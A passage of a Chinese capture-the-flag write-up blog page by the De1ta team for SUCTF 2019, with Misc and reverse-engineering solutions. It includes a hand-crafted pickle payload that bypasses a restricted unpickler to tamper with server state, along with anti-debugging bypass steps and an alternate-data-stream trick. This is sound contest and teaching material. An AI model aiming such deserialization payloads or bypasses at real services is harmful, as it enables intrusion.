<!DOCTYPE html>
<html lang="en">

<!-- Head tag -->
<head><meta name="generator" content="Hexo 3.9.0">

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!--Description-->
    
        <meta name="description" content="De1ta-Team">
    

    <!--Author-->
    
        <meta name="author" content="chybeta、pr0ph3t">
    

    <!--Open Graph Title-->
    
        <meta property="og:title" content="SUCTF 2019 Writeup">
    

    <!--Open Graph Description-->
    

    <!--Open Graph Site Name-->
    <meta property="og:site_name" content="De1ta">

    <!--Type page-->
    
        <meta property="og:type" content="article">
    

    <!--Page Cover-->
    

    <meta name="twitter:card" content="summary">
    

    <!-- Title -->
    
    <title>SUCTF 2019 Writeup - De1ta</title>

    <!-- Bootstrap Core CSS -->
    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">

    <!-- Custom Fonts -->
    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

    <!-- Gallery -->
    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet">

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/style.css">

    <!-- Google Analytics -->
    


</head>


<body>

<div class="bg-gradient"></div>
<div class="bg-pattern"></div>

<!-- Menu -->
<!--Menu Links and Overlay-->
<div class="menu-bg">
    <div class="menu-container">
        <ul>
            
            <li class="menu-item">
                <a href="/">
                    Home
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/archives">
                    Archives
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/about">
                    About
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/tags">
                    Tags
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/categories">
                    Categories
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/contact">
                    Contact
                </a>
            </li>
            
        </ul>
    </div>
</div>

<!--Hamburger Icon-->
<nav>
    <a href="#menu"></a>
</nav>

<div class="container">

    <!-- Main Content -->
    <div class="row">
    <div class="col-sm-12">

        <!--Title and Logo-->
        <header>
    <div class="logo">
        <a href="/"><img src="https://avatars0.githubusercontent.com/u/39492862"></a>
        
        <!-- hacked by chybeta -->
    </div>
</header>

        <section class="main">
            
<div class="post">

    <div class="post-header">
        <h1 class="title">
            <a href="/2019/08/19/SUCTF2019/">
                SUCTF 2019 Writeup
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2019-08-19</span>
            
            
            
        </div>
    </div>

    <div class="content">

        <!-- Gallery -->
        

        <!-- Post Content -->
        <h1 id="De1ta-Team"><a href="#De1ta-Team" class="headerlink" title=" De1ta-Team"></a> <strong>De1ta-Team</strong></h1><a id="more"></a>
<blockquote>
<p>Team: De1ta</p>
</blockquote>
<p>前排广告位：De1ta长期招 逆向/pwn/密码学/硬件/取证/杂项/etc. 选手，急招二进制和密码选手,有意向的大佬请联系<code>ZGUxdGFAcHJvdG9ubWFpbC5jb20=</code></p>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line">a=open(<span class="string">"1.txt"</span>,<span class="string">"r"</span>).read()</span><br><span class="line">c=open(<span class="string">"1.png"</span>,<span class="string">"wb"</span>)</span><br><span class="line">c.write(b64decode(a))</span><br><span class="line">c.close()</span><br></pre></td></tr></table></figure>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819100803-2d7608bc-c226-1.png" alt="image.png"></p>
<h2 id="guess-game"><a href="#guess-game" class="headerlink" title="guess_game"></a>guess_game</h2><p>一个猜数字游戏，题目提供了客户端和服务端。这个游戏有10轮，每轮猜0-10共11个数字，10轮全部猜中才出flag，直接碰撞不可能。</p>
<p>这题主要考察对 <code>pickle</code> 序列化的了解，读懂 <code>pickle</code> 的源代码，手工构造出相应 <code>payload</code> 即可。</p>
<p><img src="https://i.loli.net/2019/08/19/bL8AW9fvODPMBCa.png" alt></p>
<p><code>RestrictedUnpickler.py</code> 里重写了 <code>find_class</code>，对反序列化的对象位置进行了限制，只允许 <code>guess_game</code> 下的模块，而且不允许含 <code>__</code> 的内置对象。</p>
<p>那么可以先反序列化一个 <code>guess_game里的game对象</code>，然后再反序列化一个 <code>guess_game.Ticket里的Ticket类</code>，参数 <code>number</code> 随便赋一个值（比如6），然后将 <code>Ticket</code> 赋值给 <code>game的curr_ticket</code> 覆盖服务端随机生成的 <code>Ticket</code>，最后我们再反序列化一次最开始反序列化的 <code>Ticket</code>，参数 <code>number</code> 赋相同值。</p>
<p>将以上反序列化过程，对照 <code>pickle</code> 源代码构造好一条语句，直接循环10次打过去，就能拿到flag。</p>
<p>构造好的 <code>payload</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ticket = b&quot;\x80\x04cguess_game\ngame\nN(S&apos;curr_ticket&apos;\ncguess_game.Ticket\nTicket\nq\x00)\x81q\x01&#125;q\x02X\x06\x00\x00\x00numberq\x03K\x06sbd\x86bcguess_game.Ticket\nTicket\nq\x00)\x81q\x01&#125;q\x02X\x06\x00\x00\x00numberq\x03K\x06sb.&quot;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2019/08/19/cg5eYM7XbQUuzwK.png" alt></p>
<p>Flag: <code>flag{cabe5968-8143-4c45-91b7-557edab2ab4d}</code></p>
<h2 id="game"><a href="#game" class="headerlink" title="game"></a>game</h2><p>index.html里有一句话：<code>can u find my secret</code>?<br>在两个js文件里搜，找到一个图片文件名：<code>iZwz9i9xnerwj6o7h40eauZ.png</code>，下下来，用Stegsolver看一下LSB，发现有一串字符：<code>U2FsdGVkX1+zHjSBeYPtWQVSwXzcVFZLu6Qm0To/KeuHg8vKAxFrVQ==</code>，根据U2FsdGVkX1猜测是密文，试了一下，3DES，密钥是index.html中的字符串<code>ON2WG5DGPNUECSDBNBQV6RTBNMZV6RRRMFTX2===</code>的b32decode，解开可得flag</p>
<blockquote>
<p>flag: <code>suctf{U_F0und_1t}</code></p>
</blockquote>
<h2 id="protocol"><a href="#protocol" class="headerlink" title="protocol"></a>protocol</h2><p>简单看一下流量包，发现有很多png，foremost提取出来，图片有两种，一种是一个字符的镜面图片，另一种是空白图片，并且每隔15张字符图片后有10张空白图片。重新审计流量包，发现传输每张图片的流量的数据部分第3个字节有一定的变化规律，遂将该字节相同的空白图片与字符图片一一对应，即得flag。</p>
<blockquote>
<p>flag: <code>suctf{My_usb_pr0toco1_s0_w3ak}</code></p>
</blockquote>
<h2 id="homerouter"><a href="#homerouter" class="headerlink" title="homerouter"></a>homerouter</h2><p>先试着用binwalk提取下发的路由器固件，能看到文件：</p>
<p><img src="https://chikorita.fun/ctf_writeup/suctf_2019/img/HOMEROUTER_3.png" alt="HOMEROUTER_3.png"></p>
<p>这个时候能看到有个那么不常见的东西：</p>
<p><img src="https://chikorita.fun/ctf_writeup/suctf_2019/img/HOMEROUTER_4.png" alt="HOMEROUTER_4.png"></p>
<p>能看到配置文件里有个不寻常的东西：</p>
<p><img src="https://chikorita.fun/ctf_writeup/suctf_2019/img/HOMEROUTER_5.png" alt="HOMEROUTER_5.png"></p>
<blockquote>
<p>EasyCwmp is a GPLv2 open source implementation of the TR069 cwmp standard.</p>
</blockquote>
<p>这个时候就大概能猜想要去利用easycwmp来连接一下服务器看看会有什么。可以选择用qemu来跑固件，比较省事。还有个比较不那么靠谱的方法就是用Burp一类的工具模拟协议发包和服务器交互了。</p>
<p>有关更多信息，可以查看这里或者Google。</p>
<p><a href="https://www.twblogs.net/a/5b7f63712b717767c6af5969" target="_blank" rel="noopener">TR069之CPE與ACS的Digest驗證</a></p>
<p><a href="https://blog.csdn.net/Lock_Love_/article/details/48713243" target="_blank" rel="noopener">TR-069 协议完整的通信过程</a></p>
<p>由于这边不知道为啥qemu有点问题跑不起来，于是乎拿了一个路由器和一个软路由试了一下，下面都记录了。比赛的时候是用的一台平时折腾用的Phicomm K2，之前刷了PandoraBox，于是直接SSH上去。</p>
<h3 id="使用PandoraBox"><a href="#使用PandoraBox" class="headerlink" title="使用PandoraBox"></a>使用PandoraBox</h3><p>由于PandoraBox有预编译的包，所以可以直接：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">opkg update</span><br><span class="line">opkg install easycwmp</span><br></pre></td></tr></table></figure>
<p>然后编辑<code>/etc/config/easycwmp</code>里的acs相关的配置。串号随意改一个就好了。</p>
<p>这个时候如果尝试直接跑<code>easycwmp -f -b</code>的话可能会没有反应就退出了，好像是因为这里的easycwmp自己已经启动了。只好<code>ps</code>看一下进程，然后把它<code>kill</code>掉。</p>
<p>这个时候应该能正常用了，不过我这边没有输出，像卡住了一样，搜了一下发现应该去看syslog。于是先开着：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logread -f</span><br></pre></td></tr></table></figure>
<p>然后改了个串号再开<code>easycwmp -f -b</code>。如果发现日志里出现<code>Error reading ca cert file</code>的话，可以：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">opkg install ca-bundle</span><br></pre></td></tr></table></figure>
<p>然后重试上面的步骤。如果<code>/usr/share/easycwmp/functions</code>下的文件里有<code>system_set_password root</code>的话（没有的话就去把固件里的<code>/usr/share/easycwmp/functions/system</code>复制一份过来），应该能在日志里读到：（就是下发配置修改root密码）</p>
<p><img src="https://chikorita.fun/ctf_writeup/suctf_2019/img/HOMEROUTER_6.png" alt="HOMEROUTER_6.png"></p>
<p>最后…接下来你可能会因为接下来登录不了SSH和LuCI而怀疑人生，不要慌，因为它帮你把密码设置成了flag…</p>
<h3 id="使用OpenWRT软路由"><a href="#使用OpenWRT软路由" class="headerlink" title="使用OpenWRT软路由"></a>使用OpenWRT软路由</h3><p>这个只要搞个虚拟机就可以跑，比较简单。没有的话可以先下载一下镜像：<a href="https://downloads.openwrt.org/snapshots/targets/x86/64/" target="_blank" rel="noopener">Index of /snapshots/targets/x86/64/</a>。（其实也可以玩玩Koolshare的LEDE）</p>
<p>具体安装方法可以看这里：<a href="https://openwrt.org/docs/guide-user/virtualization/virtualbox-vm" target="_blank" rel="noopener">Run OpenWrt as a VirtualBox virtual machine</a>。</p>
<p>主要就是解压，然后转盘：</p>
<figure class="highlight bash"><figcaption><span>tab</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VBoxManage convertfromraw --format VDI openwrt-x86-64-combined-squashfs.img openwrt-x86-64-combined-squashfs.vdi</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;C:\Program Files\Oracle\VirtualBox\VBoxManage.exe&apos; convertfromraw --format VDI openwrt-x86-64-combined-squashfs.img openwrt-x86-64-combined-squashfs.vdi</span><br></pre></td></tr></table></figure>
<p>然后VirtualBox新建虚拟机，使用已存在的虚拟硬盘文件即可。启动前需要保证网卡1是仅主机（Host-only）适配器，网卡2是NAT，不然可能上不了网。（Koolshare的好像不大一样，自己看文档吧）</p>
<p>要是启动后网络还是有问题就：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uci show network</span><br></pre></td></tr></table></figure>
<p>看一下。可以：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uci <span class="built_in">set</span> network.lan.ipaddr=<span class="string">'192.168.56.2'</span></span><br><span class="line">uci commit</span><br><span class="line">reboot</span><br></pre></td></tr></table></figure>
<p>把不对的改掉。</p>
<p>然后就可以来装easycwmp了。现在没有预编译的包了，只好自己编译。</p>
<p><a href="https://chikorita.fun/ctf_writeup/suctf_2019/files/homerouter/x86_64/easycwmp_1.8.1_x86_64.ipk" target="_blank" rel="noopener">x86_64/easycwmp_1.8.1</a></p>
<p><a href="https://chikorita.fun/ctf_writeup/suctf_2019/files/homerouter/x86_64/libmicroxml_2015_03_18_caa8d3e68.ipk" target="_blank" rel="noopener">x86_64/libmicroxml</a></p>
<p><a href="https://chikorita.fun/ctf_writeup/suctf_2019/files/homerouter/i386/easycwmp_1.8.1_i386_pentium4.ipk" target="_blank" rel="noopener">i386/easycwmp_1.8.1</a></p>
<p><a href="https://chikorita.fun/ctf_writeup/suctf_2019/files/homerouter/i386/libmicroxml_2015_03_18_caa8d3e68.ipk" target="_blank" rel="noopener">i386/libmicroxml</a></p>
<p>这里贴一下自己编译的，可以直接下载对应架构的，然后：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">opkg install xxx.ipk</span><br></pre></td></tr></table></figure>
<p>非要自己编译的话就看着<a href="https://github.com/pivasoftware/easycwmp" target="_blank" rel="noopener">这里（pivasoftware/easycwmp）</a>的README编译吧。需要先<code>git clone https://github.com/openwrt/openwrt</code>，然后把<a href="http://easycwmp.org/download/easycwmp-openwrt-1.8.1.tar.gz" target="_blank" rel="noopener">easycwmp-openwrt</a>和<a href="http://easycwmp.org/download/libmicroxml.tar.gz" target="_blank" rel="noopener">microxml</a>的压缩包解压到<code>openwrt/package</code>下，这个时候在<code>openwrt</code>目录下执行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make menuconfig</span><br></pre></td></tr></table></figure>
<p>应该就能在Utilities里找到easycwmp了。根据自己的需要进行<code>make</code>即可。</p>
<p>安装完成后的操作就和在PandoraBox下差不多了，就是改配置，然后读日志，再启动客户端就好了。</p>
<p><img src="https://chikorita.fun/ctf_writeup/suctf_2019/img/HOMEROUTER_7.png" alt="HOMEROUTER_7.png"></p>
<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="signup"><a href="#signup" class="headerlink" title="signup"></a>signup</h2><p>gmp库计算RSA</p>
<p>直接在factordb分解N</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse</span><br><span class="line">p = <span class="number">282164587459512124844245113950593348271</span></span><br><span class="line">q = <span class="number">366669102002966856876605669837014229419</span></span><br><span class="line">n = p*q</span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = inverse(e,phi)</span><br><span class="line">c = <span class="number">0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35</span></span><br><span class="line">m = pow(c,d,n)</span><br><span class="line">print(hex(m)[<span class="number">2</span>:<span class="number">-1</span>].decode(<span class="string">"hex"</span>))</span><br></pre></td></tr></table></figure>
<h2 id="hardcpp"><a href="#hardcpp" class="headerlink" title="hardcpp"></a>hardcpp</h2><p>用ollvm混淆过的c++代码。</p>
<p>开头给了一个类似哈希的东西，先不管。</p>
<p>ollvm中应该开了运算混淆，流程平坦化和一些虚假分支，调试一下发现主要流程就在那一堆lamda那里。</p>
<p>输入一共21位长度，从下标为1开始加密，和之前一位进行一些四则运算，然后和enc比较，enc一共20位。</p>
<p>这些四则运算都是可逆的，所以知道一位就能求出下一位，只需要爆破下标为0的字符，即可求出flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">enc = [  <span class="number">0xF3</span>, <span class="number">0x2E</span>, <span class="number">0x18</span>, <span class="number">0x36</span>, <span class="number">0xE1</span>, <span class="number">0x4C</span>, <span class="number">0x22</span>, <span class="number">0xD1</span>, <span class="number">0xF9</span>, <span class="number">0x8C</span>,</span><br><span class="line">  <span class="number">0x40</span>, <span class="number">0x76</span>, <span class="number">0xF4</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0xA3</span>, <span class="number">0x90</span>, <span class="number">0x0E</span>, <span class="number">0xA5</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">    a = [j]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">        a.append(((enc[i] ^ ((a[i]^<span class="number">18</span>)*<span class="number">3</span>+<span class="number">2</span>))-(a[i]%<span class="number">7</span>))&amp;<span class="number">0xff</span>)</span><br><span class="line">    s = <span class="string">""</span>.join(map(chr,a))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"flag"</span> <span class="keyword">in</span> s:</span><br><span class="line">        print(s)</span><br></pre></td></tr></table></figure>
<p>查一下md5发现是井号，也就是第一个字符。</p>
<h2 id="Akira-Homework"><a href="#Akira-Homework" class="headerlink" title="Akira Homework"></a>Akira Homework</h2><p>程序有多处反调试，以及多处check，通过这些check会还原一个dll，后面多线程会进入这个dll最终到一段aes的逻辑得到flag。</p>
<p>程序中的字符串都被某一个字符异或加密了，所以搜不到字符串，但是可以对key数组查找引用找到所有加密的字符串。</p>
<p>做法以调试为主，先把地址随机化关掉，然后在所有Isdebuggerpresent和exit处下断点查看，基本遇到的反调试直接nop/jmp掉</p>
<p>开始的tls回调函数会解密四个字符串NtQueryInformationProcess，ZwQueryInformationThread，NtQueueApcThread和ntdll.dll。查找这些字符串的引用可以在后面看到用GetProcAdreee获取这些函数地址。但是使用ida调试的时候，tls回调函数被多次调用了，可能是后面多线程的关系，导致这些字符串被重复加密，到最后就没被还原去使用了，所以在这里打断点，第一次停下的时候执行解密，之后每次停下都直接set ip到最后ret</p>
<p>main函数逻辑较为简单：开头起了多线程，先看主线程的逻辑：</p>
<p>先输入一串passwd，经过一串简单的加密，解密出来是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Akira_aut0_ch3ss_!</span><br></pre></td></tr></table></figure>
<p>之后第二个check会获取当前目录，在后面加一个:signature后打开，比如/WinRev.exe:signature，从中获取内容并md5校验。md5解出来是<code>Overwatch</code>问了下队里师傅，冒号说是文件流，可以通过一下指令写入：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type 1.txt &gt;&gt; WinRev.exe:signature</span><br></pre></td></tr></table></figure>
<p>1.txt中放要写入的内容。把”Overwatch”字符串写入后就能通过check。</p>
<p>注意到两个check通过后都会调用<code>sub_140006C10</code>函数，里面调用了某个函数，下断跟进后发现是这两个函数</p>
<p><code>sub_140008910</code>和<code>sub_1400089E0</code>他们对全局变量<code>unk_1400111A0</code>进行了解密，然后SetEvent一个Handles变量，这个变量一共又三个。通过查找他的交叉引用以及<code>sub_140006C10</code>函数的引用，发现在开头起的多线程里面<code>sub_140008B20</code>又被调用了。简</p>
<p>单分析下这个函数，发现这里md5了什么东西并和一些md5值校验，相等则直接exit。这里可以猜到md5的可能是进程名，如果有ida.exe等进程则退出，通过下断点调试也能发现，在退出时可以看到md5的内容是ida64.exe。通过进程名校验后会调用<code>sub_140006C10</code>解密。判定了一个全局变量，所以只会解密一次。</p>
<p>全部通过这三个校验并完成，会看到解密完的结果有pe头。dump出来是个dll</p>
<p>之后main函数就没啥用了，sleep挂起。为了方便调试，可以修改sleep的时间，调大一些。</p>
<p>接下来主要是另一个线程中干的事了。分析beginthreadex的起始函数，注意到里面有个<code>sub_140009850</code>中信息很多。发现了DllInput以及校验了MZ字符。开头他在等待三个Handles设定完毕。但进入这个函数的条件<code>byte_140016198</code>一直没找到在哪设置。分析<code>sub_140008D20</code>函数，他会调用参数一函数指针，查找这个全局变量的引用，看到它是在<code>sub_140009C20</code>中被设置，同样的还有<code>qword_140016178</code>和<code>qword_140016180</code>，他们最终被<code>sub_140008850</code>设置成一开始tls回调函数解密的NtQueryInformationProcess，ZwQueryInformationThread和NtQueueApcThread，当他们都被成功设置后，就能成功进入<code>sub_140009850</code>的逻辑了。</p>
<p>如果wait到一个258的信号，会提示time out并推出，所以之前sleep要改长一点。</p>
<p>单步调试发现到<code>sub_140007D80</code>里面会获取输入，逐步f8跟进最终来到<code>sub_180002880</code>是最后的逻辑：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">sub_180002880</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+0h] [rbp-B8h]</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+20h] [rbp-98h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+30h] [rbp-88h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+38h] [rbp-80h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+40h] [rbp-78h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+48h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [rsp+50h] [rbp-68h]</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// [rsp+68h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">char</span> v10; <span class="comment">// [rsp+80h] [rbp-38h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+90h] [rbp-28h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;v8, <span class="number">0</span>, <span class="number">0x11</span>ui64);</span><br><span class="line">  ucrtbase_puts(<span class="string">"Now check the sign:"</span>);</span><br><span class="line">  sub_1800027A0(<span class="string">"%32s"</span>, &amp;v8);</span><br><span class="line">  v5 = kernel32_OpenEventW(<span class="number">2031619</span>i64, <span class="number">1</span>i64, <span class="string">L"DLLInput"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    kernel32_WaitForSingleObject(v5, <span class="number">0xFFFFFFFF</span>i64);</span><br><span class="line">    kernel32_CloseHandle(v5);</span><br><span class="line">    v4 = kernel32_OpenFileMappingW(<span class="number">983071</span>i64, <span class="number">0</span>i64, <span class="string">L"ShareMemory"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = <span class="number">0x8000</span>i64;</span><br><span class="line">      kernel32_MapViewOfFile();</span><br><span class="line">      v7 = v0;</span><br><span class="line">      <span class="keyword">if</span> ( v0 )</span><br><span class="line">      &#123;</span><br><span class="line">        kernel32_CloseHandle(v4);</span><br><span class="line">        v6 = ucrtbase_malloc(<span class="number">0x8000</span>i64);</span><br><span class="line">        vcruntime140_memset(v6, <span class="number">0</span>i64, <span class="number">0x8000</span>i64);</span><br><span class="line">        vcruntime140_memcpy(v6, v7, <span class="number">0x8000</span>i64);</span><br><span class="line">        <span class="built_in">strcpy</span>(&amp;v10, <span class="string">"Ak1i3aS3cre7K3y"</span>);</span><br><span class="line">        <span class="built_in">memset</span>(&amp;v9, <span class="number">0</span>, <span class="number">0x11</span>ui64);</span><br><span class="line">        sub_180002800(&amp;v10, &amp;v9, v6);</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)ucrtbase_strcmp(&amp;v9, &amp;v8) )</span><br><span class="line">          sub_1800026F0(<span class="string">"wow... game start!\n"</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          sub_1800026F0(<span class="string">"Get finally answer!\n"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        kernel32_CloseHandle(v4);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> sub_180002AB0((<span class="keyword">unsigned</span> __int64)&amp;v2 ^ v11);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中<code>sub_180002800</code>很容易看出是aes，密文是之前另一个线程里面看起来很像密文的东西，key就在这里。由于这里获取输入后直接跟解密后的明文比较，所以不需要自己解密，在strcmp下断点就能看到flag了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Ak1rAWin!&#125;</span><br></pre></td></tr></table></figure>
<h2 id="babyunic"><a href="#babyunic" class="headerlink" title="babyunic"></a>babyunic</h2><p>使用unicorn引擎，翻一下unicorn源码可以得知几个函数及参数的意思</p>
<p><a href="https://github.com/unicorn-engine/unicorn/blob/master/include/unicorn/unicorn.h" target="_blank" rel="noopener">https://github.com/unicorn-engine/unicorn/blob/master/include/unicorn/unicorn.h</a></p>
<p><a href="https://github.com/unicorn-engine/unicorn/blob/master/include/unicorn/mips.h" target="_blank" rel="noopener">https://github.com/unicorn-engine/unicorn/blob/master/include/unicorn/mips.h</a></p>
<p>可以得知架构是mips，大端序</p>
<p>输入的flag与结果分别被写到两个地址，分别作为指针通过a0和a1传入，然后设置了fp和sp的值。代码写到另一个地址，然后开始执行。最后从结果处读数据与常量对比。</p>
<p>ida自带有mips大端序处理器模块，使用retdec插件可以反编译，但是效果不是很好。</p>
<p>不过代码逻辑特别简单，很容易能看懂。</p>
<p>先是循环左移三位，然后异或下标，最后互相加减计算出42个结果。</p>
<p>因此只需解42元方程组。</p>
<p>编写脚本提取出方程组：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">bg = 0x00000378</span><br><span class="line">end = 0x00007058</span><br><span class="line">addr = bg</span><br><span class="line"></span><br><span class="line">def next_instr(addr):</span><br><span class="line">    return addr+ItemSize(addr)</span><br><span class="line">counter = 0</span><br><span class="line">counter_c = 1</span><br><span class="line"></span><br><span class="line">while(addr&lt;end):</span><br><span class="line">    counter = 0</span><br><span class="line">    print &quot;flag[0]&quot;,</span><br><span class="line">    while(True):</span><br><span class="line">        next = next_instr(addr)</span><br><span class="line">        mnem = GetMnem(addr)</span><br><span class="line"></span><br><span class="line">        if &apos;addiu&apos; in mnem:</span><br><span class="line">            counter+=1</span><br><span class="line">        elif &apos;addu&apos; in mnem:</span><br><span class="line">            print &quot;+ flag[%d]&quot;%counter,</span><br><span class="line">        elif &quot;subu&quot; in mnem:</span><br><span class="line">            print &quot;- flag[%d]&quot;%counter,</span><br><span class="line">        if 